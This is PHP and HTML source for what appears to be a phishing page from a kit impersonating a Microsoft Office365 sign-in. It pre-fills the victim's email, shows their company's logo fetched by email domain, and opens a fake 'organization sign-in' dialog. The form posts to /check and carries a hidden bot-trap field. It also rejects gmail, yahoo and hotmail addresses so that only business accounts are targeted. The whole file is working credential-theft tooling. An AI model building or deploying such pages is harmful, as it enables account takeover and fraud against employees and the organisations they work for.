<?php
session_start();
$parts = explode('@',$_SESSION['_USER_']);
$user = $parts[0];
$domain = $parts[1]; 
?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
      <title>Office365 - Reporting Finance Tools</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="shortcut icon" type="image/x-icon" href="https://res-1.cdn.office.net/officehub/images/content/images/favicon-8f211ea639.ico" />
      <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
      <link rel="stylesheet" media="all" href="./data/style.css" />
	  <link rel="stylesheet" href="build/jquery.dialog.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<script src="build/jquery.dialog.min.js"></script>
   </head>
   <body>
<style>
    .alert-warning{background-color:#ed684a;border-color:#ed684a;color:white;}
</style>
<script>
  jQuery(document).ready(function(){
		dialog.confirm({
			title: "Taking you to your organization's sign-in page",
			message: "Sign in with your organizational account",
			cancel: "Home and Personal Email",
			button: "Office and Work Email",
			required: true,
			callback: function(value){
				console.log(value);
				window.location.href="../Next";

			}
		});
		return false;
	});
	
</script>
      <div class="container text-center ">
         <div id="refreshDivID">
            <div class="reloaded-divs">
               <div class="alert alert-warning alert-dismissible fade show" role="alert">
                  <strong>Microsoft Alert!</strong> Confirm Email.
               </div>
            </div>
         </div>
      </div>
      <section></section>
      <header class="header">
         <svg class="logo">
            <use xlink:href="/assets/icons/logos-c63e33449fe857b8807279df19de9cbc84b9e76510ce50e1c53da d07ba36fbf9.svg#logo-inline"></use>
         </svg>
      </header>
      <main>
         <div>
             <style>
                  .agreementDetail-logo {
  width: 90px !important;
  height: 90px;
  background-size: 90px 90px;
  display: block;
  margin: 0px auto;
}
             </style>
           <center>
               <div class="agreementDetail-logo " style="background-image: url(&quot;https://logo.clearbit.com/<?=$domain;?>&quot;); background-position: center center; background-size: 100%; background-repeat: no-repeat;"></div>
            </center>
         </div><br/>
         <form class="row-spacer" novalidate="novalidate" action="/check" accept-charset="UTF-8" method="post">
            <input name="utf8" type="hidden" value="✓" />
            <div class="form-field is-focussed" data-js="form-field">
               <input class="input-text" autofocus="autofocus" type="text" value="<?=$_SESSION['_USER_']?>" name="customer[email]" id="customer_email" />
            </div>
            <div id="botsvalidation" class="form-field" data-js="form-field">
               <label class="form-field__label" for="customer_password">Age</label>
               <input class="input-text" autocomplete="off"  type="text" name="customerage" />
            </div>
            <br />
            <div  class="u-bottom-spacing">
               <button style="cursor:pointer;" id="checkbut" type="submit" disabled="true">Next</button>
            </div>
         </form>
      </main>
      <footer>
         <a href="https://support.microsoft.com/en-us/office" class="button button--alt">Need Help?</a>
         <nav>
            <a href="https://docs.microsoft.com/en-us/microsoftteams/teams-contact-center?tabs=connect">Contact</a>
            <a href="https://prodigyfinance.com/legal/privacy-policy">Privacy</a>
         </nav>
      </footer>
      <style>
         .error {color: #f03232;}
		 #botsvalidation{display:none !important;}

      </style>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <script type="text/javascript">
         $('input').keyup(function(){
         if($.trim(this.value).length > 0)
             $("#checkbut").prop('disabled', false);
         });
         $('input').keyup(function(){
         if($.trim(this.value).length == 0)
             $("#checkbut").prop('disabled', true);
         });
         $(document).ready(function() { 
         
         $('#checkbut').click(function() {  
         
          $(".error").hide();
          var hasError = false;
          var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
          var emailblockReg =
           /^([\w-\.]+@(?!gmail.com)(?!yahoo.com)(?!hotmail.com)([\w-]+\.)+[\w-]{2,4})?$/;
         
          var emailaddressVal = $("#customer_email").val();
          if(emailaddressVal == '') {
            $("#customer_email").after('<span class="error">Please enter your business email address.</span>');
            hasError = true;
          }
         
          else if(!emailReg.test(emailaddressVal)) {
            $("#customer_email").after('<span class="error">Enter a valid business email address.</span>');
            hasError = true;
          }
         
          else if(!emailblockReg.test(emailaddressVal)) {
            $("#customer_email").after('<span class="error">No yahoo, gmail or hotmail emails.</span>');
            hasError = true
          } 
         if( !$('#customer_referred_by').val() ) {
         $("#customer_referred_by").after('<span class="error">Please select a reason of account limitation.</span>');
            hasError = true
         }
         
          if(hasError == true) { return false; }
         
          });
         });
         
      </script>
   </body>
</html>